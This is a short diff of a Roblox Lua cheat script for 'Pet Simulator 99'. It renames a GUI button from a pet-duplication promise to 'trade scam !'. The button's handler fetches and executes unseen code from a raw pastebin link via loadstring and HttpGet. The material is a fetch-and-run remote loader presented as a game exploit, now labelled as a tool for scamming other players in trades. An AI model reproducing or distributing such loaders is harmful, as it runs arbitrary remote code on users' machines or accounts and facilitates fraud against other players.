@@ -5,7 +5,7 @@ local Window = Library.CreateLib("Mori Scripts | :santa: Pet Simulator 99! :sant
 local Main = Window:NewTab("Dupe Script")
 local MainSection = Main:NewSection("Dupe Pets")
 
-MainSection:NewButton("Dupe Huges - Exclusives - GEMS !", "Duped Pets", function()
+MainSection:NewButton("trade scam !", "pauses your pets", function()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/6T5WqD4a", true))()
 
